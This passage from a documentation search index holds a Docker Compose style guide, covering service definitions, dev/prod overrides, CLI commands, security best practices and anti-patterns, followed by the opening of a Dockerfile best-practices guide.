'3.8'\n\nservices:\n  # Frontend\n  frontend:\n    build:\n      context: ./frontend\n      dockerfile: Dockerfile\n      target: production\n    image: myapp/frontend:latest\n    container_name: myapp-frontend\n    ports:\n      - \"3000:3000\"\n    environment:\n      - REACT_APP_API_URL=http://localhost:8080\n    networks:\n      - frontend_net\n    depends_on:\n      - api\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:3000\"]\n      interval: 30s\n      timeout: 5s\n      retries: 3\n\n  # Backend API\n  api:\n    build:\n      context: ./api\n      dockerfile: Dockerfile\n    image: myapp/api:latest\n    container_name: myapp-api\n    ports:\n      - \"8080:8080\"\n    environment:\n      - NODE_ENV=production\n      - DATABASE_URL=postgresql://postgres:${DB_PASSWORD}@database:5432/myapp\n      - REDIS_URL=redis://redis:6379\n      - JWT_SECRET=${JWT_SECRET}\n    env_file:\n      - .env.production\n    networks:\n      - frontend_net\n      - backend_net\n    depends_on:\n      database:\n        condition: service_healthy\n      redis:\n        condition: service_started\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8080/health\"]\n      interval: 30s\n      timeout: 5s\n      retries: 3\n      start_period: 40s\n\n  # Database\n  database:\n    image: postgres:15-alpine\n    container_name: myapp-database\n    environment:\n      POSTGRES_USER: postgres\n      POSTGRES_PASSWORD: ${DB_PASSWORD}\n      POSTGRES_DB: myapp\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n      - ./init.sql:/docker-entrypoint-initdb.d/init.sql:ro\n    networks:\n      - backend_net\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  # Redis Cache\n  redis:\n    image: redis:7-alpine\n    container_name: myapp-redis\n    command: redis-server --appendonly yes\n    volumes:\n      - redis_data:/data\n    networks:\n      - backend_net\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  # Nginx Reverse Proxy\n  nginx:\n    image: nginx:alpine\n    container_name: myapp-nginx\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro\n      - ./nginx/ssl:/etc/nginx/ssl:ro\n    networks:\n      - frontend_net\n    depends_on:\n      - frontend\n      - api\n    restart: unless-stopped\n\nnetworks:\n  frontend_net:\n    driver: bridge\n  backend_net:\n    driver: bridge\n    internal: true\n\nvolumes:\n  postgres_data:\n    driver: local\n  redis_data:\n    driver: local\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#development-vs-production","title":"Development vs Production","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#development-compose-file","title":"Development Compose File","text":"<p><code>docker-compose.dev.yml</code>:</p> <pre><code>version: '3.8'\n\nservices:\n  app:\n    build:\n      context: .\n      target: development\n    volumes:\n      # Hot reload\n      - ./src:/app/src\n      - /app/node_modules\n    environment:\n      - NODE_ENV=development\n      - DEBUG=*\n    command: npm run dev\n    ports:\n      - \"3000:3000\"\n      - \"9229:9229\"  # Debug port\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#production-compose-file","title":"Production Compose File","text":"<p><code>docker-compose.prod.yml</code>:</p> <pre><code>version: '3.8'\n\nservices:\n  app:\n    build:\n      context: .\n      target: production\n    environment:\n      - NODE_ENV=production\n    restart: always\n    logging:\n      driver: \"json-file\"\n      options:\n        max-size: \"10m\"\n        max-file: \"3\"\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#using-multiple-compose-files","title":"Using Multiple Compose Files","text":"<pre><code>## Development\ndocker-compose -f docker-compose.yml -f docker-compose.dev.yml up\n\n## Production\ndocker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#extends-and-anchors","title":"Extends and Anchors","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#using-anchors-yaml-feature","title":"Using Anchors (YAML feature)","text":"<pre><code>version: '3.8'\n\nx-common-variables: &amp;common-variables\n  NODE_ENV: production\n  LOG_LEVEL: info\n\nx-logging: &amp;default-logging\n  driver: \"json-file\"\n  options:\n    max-size: \"10m\"\n    max-file: \"3\"\n\nservices:\n  web:\n    image: myapp/web\n    environment:\n      &lt;&lt;: *common-variables\n      PORT: 3000\n    logging: *default-logging\n\n  api:\n    image: myapp/api\n    environment:\n      &lt;&lt;: *common-variables\n      PORT: 8080\n    logging: *default-logging\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#docker-compose-commands","title":"Docker Compose Commands","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#common-commands","title":"Common Commands","text":"<pre><code>## Start services\ndocker-compose up\n\n## Start in detached mode\ndocker-compose up -d\n\n## Build images\ndocker-compose build\n\n## Build with no cache\ndocker-compose build --no-cache\n\n## Stop services\ndocker-compose stop\n\n## Stop and remove containers\ndocker-compose down\n\n## Stop and remove containers, volumes, and images\ndocker-compose down -v --rmi all\n\n## View logs\ndocker-compose logs\n\n## Follow logs\ndocker-compose logs -f\n\n## Logs for specific service\ndocker-compose logs -f api\n\n## Execute command in running container\ndocker-compose exec api sh\n\n## Run one-off command\ndocker-compose run api npm test\n\n## List containers\ndocker-compose ps\n\n## View running processes\ndocker-compose top\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#security-best-practices","title":"Security Best Practices","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#never-hardcode-secrets","title":"Never Hardcode Secrets","text":"<p>Avoid storing sensitive data in docker-compose.yml:</p> <pre><code>## Bad - Hardcoded secrets\nservices:\n  db:\n    image: postgres:15\n    environment:\n      POSTGRES_PASSWORD: MySecretPassword123  # \u274c Exposed in version control!\n      API_KEY: sk-1234567890abcdef  # \u274c Hardcoded!\n\n## Good - Use environment files\nservices:\n  db:\n    image: postgres:15\n    env_file:\n      - .env  # \u2705 Gitignored file with secrets\n\n## Good - Use Docker secrets (Swarm mode)\nservices:\n  db:\n    image: postgres:15\n    secrets:\n      - db_password\n    environment:\n      POSTGRES_PASSWORD_FILE: /run/secrets/db_password\n\nsecrets:\n  db_password:\n    file: ./secrets/db_password.txt\n\n## Good - Use external secret references\nservices:\n  app:\n    image: myapp:latest\n    environment:\n      DB_PASSWORD: ${DB_PASSWORD}  # \u2705 From environment\n</code></pre> <p>Key Points:</p> <ul> <li>Never commit secrets to docker-compose.yml</li> <li>Use <code>.env</code> files (add to <code>.gitignore</code>)</li> <li>Use Docker secrets for Swarm mode</li> <li>Use environment variables for 12-factor apps</li> <li>Reference external secret managers (Vault, AWS Secrets Manager)</li> <li>Rotate secrets regularly</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#use-minimal-trusted-images","title":"Use Minimal, Trusted Images","text":"<p>Only use official, verified, and minimal base images:</p> <pre><code>## Bad - Unknown or outdated images\nservices:\n  app:\n    image: randomuser/myapp:latest  # \u274c Untrusted source!\n    # Using 'latest' tag - unpredictable\n\n## Good - Official, version-pinned, minimal images\nservices:\n  app:\n    image: node:20.10.0-alpine  # \u2705 Official, specific version, minimal\n    # alpine variant is smaller and has fewer vulnerabilities\n\n  db:\n    image: postgres:15.5-alpine  # \u2705 Official PostgreSQL with specific version\n\n## Good - Use digest pinning for immutability\nservices:\n  app:\n    image: node@sha256:abcd1234...  # \u2705 Immutable digest\n</code></pre> <p>Key Points:</p> <ul> <li>Use official images from Docker Hub</li> <li>Pin specific versions (never use <code>latest</code>)</li> <li>Use minimal variants (<code>alpine</code>, <code>distroless</code>)</li> <li>Verify image signatures</li> <li>Use digest pinning for critical services</li> <li>Regularly update base images</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#run-as-non-root-user","title":"Run as Non-Root User","text":"<p>Never run containers as root:</p> <pre><code>## Bad - Running as root (default)\nservices:\n  app:\n    image: node:20-alpine\n    # No user specified - runs as root \u274c\n\n## Good - Run as non-root user\nservices:\n  app:\n    image: node:20-alpine\n    user: \"1000:1000\"  # \u2705 Non-root user\n    # Or use 'node' user built into Node image\n    # user: node\n\n## Good - Define non-root user in Dockerfile\n# Dockerfile\nFROM node:20-alpine\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\nUSER nodejs\n</code></pre> <p>Key Points:</p> <ul> <li>Always specify a non-root user</li> <li>Use UID:GID format for clarity</li> <li>Create users in Dockerfile</li> <li>Never use UID 0 (root)</li> <li>Test that application works as non-root</li> <li>Use <code>read_only</code> filesystems where possible</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#limit-resources","title":"Limit Resources","text":"<p>Prevent resource exhaustion:</p> <pre><code>## Bad - No resource limits\nservices:\n  app:\n    image: myapp:latest\n    # No limits - can consume all host resources \u274c\n\n## Good - Set resource limits\nservices:\n  app:\n    image: myapp:latest\n    deploy:\n      resources:\n        limits:\n          cpus: '0.5'\n          memory: 512M\n        reservations:\n          cpus: '0.25'\n          memory: 256M\n    # Prevent fork bombs\n    pids_limit: 100\n\n  db:\n    image: postgres:15-alpine\n    deploy:\n      resources:\n        limits:\n          cpus: '1.0'\n          memory: 1G\n</code></pre> <p>Key Points:</p> <ul> <li>Set CPU and memory limits</li> <li>Set PID limits to prevent fork bombs</li> <li>Use reservations for guaranteed resources</li> <li>Monitor resource usage</li> <li>Adjust limits based on actual usage</li> <li>Prevent denial of service</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#network-segmentation","title":"Network Segmentation","text":"<p>Isolate services with network boundaries:</p> <pre><code>## Bad - All services on default bridge\nservices:\n  web:\n    image: nginx:alpine\n    ports:\n      - \"80:80\"\n  app:\n    image: myapp:latest\n  db:\n    image: postgres:15\n    # All on same network - no isolation \u274c\n\n## Good - Separate networks for isolation\nservices:\n  web:\n    image: nginx:alpine\n    ports:\n      - \"80:80\"\n    networks:\n      - frontend  # Only frontend network\n\n  app:\n    image: myapp:latest\n    networks:\n      - frontend  # Connect to both\n      - backend\n\n  db:\n    image: postgres:15\n    networks:\n      - backend  # Only backend network - isolated from web\n\nnetworks:\n  frontend:\n    driver: bridge\n  backend:\n    driver: bridge\n    internal: true  # \u2705 No external access\n</code></pre> <p>Key Points:</p> <ul> <li>Create separate networks for tiers</li> <li>Use <code>internal: true</code> for backend networks</li> <li>Limit exposed ports</li> <li>Use service names for internal DNS</li> <li>Implement zero-trust networking</li> <li>Monitor network traffic</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#read-only-filesystems","title":"Read-Only Filesystems","text":"<p>Use read-only root filesystems:</p> <pre><code>## Good - Read-only filesystem\nservices:\n  app:\n    image: myapp:latest\n    read_only: true  # \u2705 Immutable root filesystem\n    tmpfs:\n      - /tmp  # Writable tmpfs for temporary files\n      - /var/run\n\n  nginx:\n    image: nginx:alpine\n    read_only: true\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro  # \u2705 Read-only config\n      - nginx-cache:/var/cache/nginx  # Writable volume for cache\n      - nginx-run:/var/run\n\nvolumes:\n  nginx-cache:\n  nginx-run:\n</code></pre> <p>Key Points:</p> <ul> <li>Use <code>read_only: true</code> for immutable containers</li> <li>Mount tmpfs for temporary writable space</li> <li>Mount configs as read-only (<code>:ro</code>)</li> <li>Use volumes for persistent writable data</li> <li>Prevents malware persistence</li> <li>Enhances security posture</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#security-options","title":"Security Options","text":"<p>Enable security features:</p> <pre><code>## Good - Security options enabled\nservices:\n  app:\n    image: myapp:latest\n    security_opt:\n      - no-new-privileges:true  # \u2705 Prevent privilege escalation\n      - apparmor=docker-default  # Enable AppArmor\n      # - seccomp=seccomp-profile.json  # Custom seccomp profile\n\n    cap_drop:\n      - ALL  # \u2705 Drop all capabilities\n    cap_add:\n      - NET_BIND_SERVICE  # Only add required capabilities\n\n    privileged: false  # \u2705 Never use privileged mode\n</code></pre> <p>Key Points:</p> <ul> <li>Always set <code>no-new-privileges:true</code></li> <li>Drop all capabilities, add only required ones</li> <li>Never use <code>privileged: true</code></li> <li>Enable AppArmor or SELinux</li> <li>Use custom seccomp profiles</li> <li>Minimize attack surface</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#container-health-and-availability-checks","title":"Container Health and Availability Checks","text":"<p>Implement health checks for availability and security:</p> <pre><code>## Good - Health checks configured\nservices:\n  app:\n    image: myapp:latest\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:3000/health\"]\n      interval: 30s\n      timeout: 10s\n      retries: 3\n      start_period: 40s\n\n  db:\n    image: postgres:15-alpine\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n</code></pre> <p>Key Points:</p> <ul> <li>Define health checks for all services</li> <li>Use appropriate intervals and timeouts</li> <li>Monitor health check status</li> <li>Restart unhealthy containers</li> <li>Use health checks for rolling updates</li> <li>Prevent zombie containers</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#anti-patterns","title":"Anti-Patterns","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#avoid-hardcoded-secrets","title":"\u274c Avoid: Hardcoded Secrets","text":"<pre><code>## Bad - Hardcoded password\nservices:\n  database:\n    environment:\n      POSTGRES_PASSWORD: mysecretpassword\n\n## Good - Use environment variables\nservices:\n  database:\n    environment:\n      POSTGRES_PASSWORD: ${DB_PASSWORD}\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#avoid-latest-tag","title":"\u274c Avoid: latest Tag","text":"<pre><code>## Bad - Unpredictable\nservices:\n  app:\n    image: myapp:latest\n\n## Good - Specific version\nservices:\n  app:\n    image: myapp:1.2.3\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#avoid-not-using-volumes-for-data","title":"\u274c Avoid: Not Using Volumes for Data","text":"<pre><code>## Bad - Data lost when container stops\nservices:\n  database:\n    image: postgres\n\n## Good - Persistent volume\nservices:\n  database:\n    image: postgres\n    volumes:\n      - db_data:/var/lib/postgresql/data\n\nvolumes:\n  db_data:\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#avoid-not-using-health-checks","title":"\u274c Avoid: Not Using Health Checks","text":"<pre><code>## Bad - No health checks\nservices:\n  api:\n    image: myapi:1.0\n    ports:\n      - \"8080:8080\"\n\n## Good - With health check\nservices:\n  api:\n    image: myapi:1.0\n    ports:\n      - \"8080:8080\"\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8080/health\"]\n      interval: 30s\n      timeout: 3s\n      retries: 3\n      start_period: 40s\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#avoid-running-as-root","title":"\u274c Avoid: Running as Root","text":"<pre><code>## Bad - Default root user\nservices:\n  app:\n    image: node:18\n    command: npm start\n\n## Good - Specify non-root user\nservices:\n  app:\n    image: node:18\n    user: \"node\"\n    command: npm start\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#avoid-not-setting-resource-limits","title":"\u274c Avoid: Not Setting Resource Limits","text":"<pre><code>## Bad - No resource limits (can exhaust host)\nservices:\n  app:\n    image: myapp:1.0\n\n## Good - Set limits\nservices:\n  app:\n    image: myapp:1.0\n    deploy:\n      resources:\n        limits:\n          cpus: '0.50'\n          memory: 512M\n        reservations:\n          cpus: '0.25'\n          memory: 256M\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#avoid-not-using-depends-on","title":"\u274c Avoid: Not Using Depends On","text":"<pre><code>## Bad - Services start in parallel (race condition)\nservices:\n  api:\n    image: myapi:1.0\n  database:\n    image: postgres:14\n\n## Good - Explicit dependencies\nservices:\n  api:\n    image: myapi:1.0\n    depends_on:\n      database:\n        condition: service_healthy\n  database:\n    image: postgres:14\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 5s\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#best-practices","title":"Best Practices","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#use-dockerignore","title":"Use .dockerignore","text":"<pre><code>node_modules\nnpm-debug.log\n.git\n.env\n.DS_Store\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#health-checks","title":"Health Checks","text":"<pre><code>services:\n  api:\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8080/health\"]\n      interval: 30s\n      timeout: 10s\n      retries: 3\n      start_period: 40s\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#resource-limits","title":"Resource Limits","text":"<pre><code>services:\n  app:\n    deploy:\n      resources:\n        limits:\n          cpus: '0.50'\n          memory: 512M\n        reservations:\n          cpus: '0.25'\n          memory: 256M\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#dependency-management","title":"Dependency Management","text":"<pre><code>services:\n  api:\n    depends_on:\n      database:\n        condition: service_healthy\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#tool-configuration","title":"Tool Configuration","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#docker-composeyml-validation","title":"docker-compose.yml Validation","text":"<pre><code>## Validate compose file syntax\ndocker compose config\n\n## Validate and show final configuration\ndocker compose config --no-interpolate\n\n## Validate specific file\ndocker compose -f docker-compose.prod.yml config\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#dockerignore","title":".dockerignore","text":"<pre><code>## Version control\n.git\n.gitignore\n.gitattributes\n\n## CI/CD\n.github\n.gitlab-ci.yml\n.travis.yml\n\n## Documentation\n*.md\ndocs/\nLICENSE\n\n## Dependencies\nnode_modules/\nvendor/\n__pycache__/\n*.pyc\n\n## Build artifacts\ndist/\nbuild/\n*.egg-info/\n\n## IDE\n.vscode/\n.idea/\n*.swp\n*.swo\n\n## Environment\n.env.local\n.env.*.local\n*.log\n\n## Testing\ncoverage/\n.nyc_output/\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#editorconfig","title":"EditorConfig","text":"<pre><code>## .editorconfig\n[docker-compose*.{yml,yaml}]\nindent_style = space\nindent_size = 2\nend_of_line = lf\ncharset = utf-8\ntrim_trailing_whitespace = true\ninsert_final_newline = true\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#vs-code-settings","title":"VS Code Settings","text":"<pre><code>{\n  \"[dockercompose]\": {\n    \"editor.defaultFormatter\": \"redhat.vscode-yaml\",\n    \"editor.formatOnSave\": true\n  },\n  \"yaml.schemas\": {\n    \"https://raw.githubusercontent.com/compose-spec/compose-spec/master/schema/compose-spec.json\": [\n      \"docker-compose*.yml\",\n      \"docker-compose*.yaml\"\n    ]\n  },\n  \"yaml.customTags\": [\n    \"!reference sequence\"\n  ]\n}\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#pre-commit-hooks","title":"Pre-commit Hooks","text":"<pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n        args: ['--allow-multiple-documents']\n      - id: check-added-large-files\n\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.35.1\n    hooks:\n      - id: yamllint\n        args: ['-d', '{extends: default, rules: {line-length: {max: 120}}}']\n        files: docker-compose.*\\.ya?ml$\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#yamllint-configuration","title":"yamllint Configuration","text":"<pre><code>## .yamllint\nextends: default\n\nrules:\n  line-length:\n    max: 120\n    level: warning\n  indentation:\n    spaces: 2\n    indent-sequences: true\n  comments:\n    min-spaces-from-content: 1\n  document-start: disable\n  truthy:\n    allowed-values: ['true', 'false', 'yes', 'no']\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#makefile","title":"Makefile","text":"<pre><code>## Makefile\n.PHONY: up down build logs ps validate\n\nup:\n docker compose up -d\n\ndown:\n docker compose down\n\nbuild:\n docker compose build\n\nrebuild:\n docker compose build --no-cache\n\nlogs:\n docker compose logs -f\n\nps:\n docker compose ps\n\nvalidate:\n docker compose config --quiet\n @echo \"\u2713 docker-compose.yml is valid\"\n\nvalidate-prod:\n docker compose -f docker-compose.prod.yml config --quiet\n @echo \"\u2713 docker-compose.prod.yml is valid\"\n\nclean:\n docker compose down -v\n docker system prune -f\n\nexec-web:\n docker compose exec web sh\n\nexec-db:\n docker compose exec db psql -U postgres\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#docker-composeoverrideyml","title":"docker-compose.override.yml","text":"<p>Used for local development overrides:</p> <pre><code>## docker-compose.override.yml\n## This file is automatically merged with docker-compose.yml\n## Use for local development settings\n\nservices:\n  web:\n    environment:\n      - DEBUG=true\n      - LOG_LEVEL=debug\n    volumes:\n      - ./src:/app/src:delegated\n    ports:\n      - \"3000:3000\"\n      - \"9229:9229\"  # Node.js debug port\n    command: npm run dev\n\n  db:\n    ports:\n      - \"5432:5432\"  # Expose PostgreSQL locally\n</code></pre>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#references","title":"References","text":"","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#official-documentation","title":"Official Documentation","text":"<ul> <li>Docker Compose Documentation</li> <li>Compose File Reference</li> <li>Compose CLI Reference</li> </ul>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/docker_compose/#additional-resources","title":"Additional Resources","text":"<ul> <li>Production Best Practices</li> <li>Compose in Production</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["docker-compose","docker","containers","orchestration","devops"]},{"location":"02_language_guides/dockerfile/","title":"Dockerfile Style Guide","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#language-overview","title":"Language Overview","text":"<p>Dockerfile is a text file containing instructions to build Docker container images. This guide covers Dockerfile best practices for creating secure, efficient, and maintainable container images.</p>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>File Name: <code>Dockerfile</code> (no extension)</li> <li>Primary Use: Building Docker container images</li> <li>Key Principles: Multi-stage builds, layer caching, security, minimal image size</li> </ul>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Instructions Base Image <code>FROM</code> <code>FROM node:20-alpine</code> Use specific tags, prefer slim/alpine Working Dir <code>WORKDIR</code> <code>WORKDIR /app</code> Sets working directory Copy Files <code>COPY</code> <code>COPY package.json ./</code> Copy from build context Run Command <code>RUN</code> <code>RUN npm install</code> Execute at build time Environment <code>ENV</code> <code>ENV NODE_ENV=production</code> Set environment variables Expose Port <code>EXPOSE</code> <code>EXPOSE 3000</code> Document exposed ports User <code>USER</code> <code>USER node</code> Run as non-root user Entrypoint <code>ENTRYPOINT</code> <code>ENTRYPOINT [\"node\", \"app.js\"]</code> Main executable Command <code>CMD</code> <code>CMD [\"serve\"]</code> Default arguments Best Practices Multi-stage Use stages <code>FROM ... AS builder</code> Separate build/runtime Layer Order Least to most changing Dependencies before source Optimize caching <code>.dockerignore</code> Always use <code>.git</code>, <code>node_modules</code> Exclude unnecessary files Combine RUN Chain commands <code>RUN apt-get update &amp;&amp; \\</code> Reduce layers Security Non-root user <code>USER node</code> Never run as root File Naming Standard <code>Dockerfile</code> <code>Dockerfile</code> No extension Multi-stage <code>Dockerfile.{env}</code> <code>Dockerfile.prod</code> Environment-specific Common Patterns Node.js Copy package.json first <code>COPY package*.json ./</code> Cache dependencies Python Copy requirements first <code>COPY requirements.txt ./</code> Cache dependencies Go Multi-stage build <code>FROM golang AS builder</code> Small final image","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#basic-structure","title":"Basic Structure","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#simple-dockerfile","title":"Simple Dockerfile","text":"<pre><code>## Syntax version (optional but recommended)\n## syntax=docker/dockerfile:1\n\nFROM node:18-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\n\nRUN npm ci --only=production\n\nCOPY . .\n\nEXPOSE 3000\n\nCMD [\"node\", \"index.js\"]\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#from-instruction","title":"FROM Instruction","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#always-pin-base-image-versions","title":"Always Pin Base Image Versions","text":"<pre><code>## Good - Pinned to specific version\nFROM node:18.19-alpine3.19\n\n## Avoid - Using latest or unpinned versions\nFROM node:latest\nFROM node:18\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#multi-stage-builds","title":"Multi-Stage Builds","text":"<pre><code>## Build stage\nFROM node:18-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\n## Production stage\nFROM node:18-alpine AS production\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\nCOPY --from=builder /app/dist ./dist\nEXPOSE 3000\nCMD [\"node\", \"dist/index.js\"]\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#workdir-instruction","title":"WORKDIR Instruction","text":"<p>Always use <code>WORKDIR</code> instead of <code>RUN cd</code>:</p> <pre><code>## Good - Using WORKDIR\nWORKDIR /app\nCOPY . .\n\n## Bad - Using cd\nRUN cd /app\nCOPY . .\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#copy-vs-add","title":"COPY vs ADD","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#use-copy-for-local-files","title":"Use COPY for Local Files","text":"<pre><code>## Good - COPY for local files\nCOPY package.json ./\nCOPY src/ ./src/\n\n## Avoid - ADD has implicit extraction behavior\nADD package.json ./\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#use-add-only-for-urls-or-tar-extraction","title":"Use ADD Only for URLs or Tar Extraction","text":"<pre><code>## ADD for remote URLs (but prefer RUN wget/curl for better control)\nADD https://example.com/file.tar.gz /tmp/\n\n## ADD for automatic tar extraction\nADD archive.tar.gz /opt/\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#run-instruction","title":"RUN Instruction","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#combine-commands-to-reduce-layers","title":"Combine Commands to Reduce Layers","text":"<pre><code>## Good - Single layer\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y \\\n      curl \\\n      git \\\n      vim &amp;&amp; \\\n    apt-get clean &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n\n## Avoid - Multiple layers\nRUN apt-get update\nRUN apt-get install -y curl\nRUN apt-get install -y git\nRUN apt-get install -y vim\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#clean-up-in-same-layer","title":"Clean Up in Same Layer","text":"<pre><code>## Good - Clean up in same RUN instruction\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y build-essential &amp;&amp; \\\n    make &amp;&amp; \\\n    apt-get remove -y build-essential &amp;&amp; \\\n    apt-get autoremove -y &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n\n## Bad - Clean up in separate layer (doesn't reduce image size)\nRUN apt-get update\nRUN apt-get install -y build-essential\nRUN make\nRUN apt-get remove -y build-essential\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#env-instruction","title":"ENV Instruction","text":"<pre><code>## Environment variables\nENV NODE_ENV=production \\\n    PORT=3000 \\\n    LOG_LEVEL=info\n\n## Path variables\nENV 